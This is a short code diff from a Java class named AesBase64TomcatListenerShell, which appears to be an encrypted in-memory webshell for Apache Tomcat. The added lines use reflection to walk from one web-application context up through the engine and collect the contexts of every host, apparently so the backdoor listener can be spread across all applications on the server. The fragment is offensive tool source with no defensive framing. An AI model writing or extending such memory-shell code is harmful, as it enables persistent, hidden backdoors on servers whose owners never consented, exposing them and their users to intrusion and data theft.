@@ -98,9 +98,23 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
         if (obj != null) {
             contexts.add(obj);
             try {
-                Map contextMap = (Map) getFieldValue(getFieldValue(obj,"parent"),"children");
+                Map contextMap = (Map) getFieldValue(getFieldValue(obj, "parent"), "children");
                 contexts.addAll(contextMap.values());
-            }catch (Exception e){
+            } catch (Exception e) {
+
+            }
+
+            try {
+                Map hosts = (Map) getFieldValue(getFieldValue(getFieldValue(obj, "parent"), "parent"), "children");
+                Iterator iterator = hosts.values().iterator();
+                while (iterator.hasNext()) {
+                    Object host = iterator.next();
+                    if (host != null) {
+                        Map contextMap = (Map) getFieldValue(host, "children");
+                        contexts.addAll(contextMap.values());
+                    }
+                }
+            } catch (Exception e) {
 
             }
         }
